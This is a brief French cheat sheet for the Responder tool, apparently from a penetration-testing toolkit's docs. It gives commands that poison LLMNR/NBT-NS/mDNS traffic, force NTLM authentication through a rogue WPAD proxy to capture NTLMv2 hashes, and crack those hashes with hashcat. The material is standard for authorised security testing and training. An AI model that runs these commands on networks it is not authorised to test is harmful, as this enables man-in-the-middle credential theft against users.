# 🎣 Responder - LLMNR/NBT-NS/mDNS Poisoner

## Description

Responder empoisonne les requêtes LLMNR, NBT-NS et mDNS pour capturer des credentials NTLM en clair sur les réseaux Windows.

**Use case :** Attaque Man-in-the-Middle pour capturer hash NTLMv2.

---

## Installation

✅ **Déjà installé dans Kali Headless**

```bash
responder -h
```

---

## Exemples pratiques

### Mode basique

```bash
# Écouter sur eth0
sudo responder -I eth0 -wrf

# Options :
# -w : WPAD rogue proxy
# -r : Enable DHCP
# -f : Force NTLM/Basic auth
```

### Analyser le réseau (passif)

```bash
# Mode analyse (pas d'empoisonnement)
sudo responder -I eth0 -A
```

### Capturer et cracker

```bash
# 1. Lancer Responder
sudo responder -I eth0 -wrf

# 2. Attendre qu'un utilisateur se connecte
# Résultat : NTLMv2 hash capturé

# 3. Cracker avec Hashcat
hashcat -m 5600 hash.txt rockyou.txt
```

---

## Ressources

- [Responder GitHub](https://github.com/lgandx/Responder)
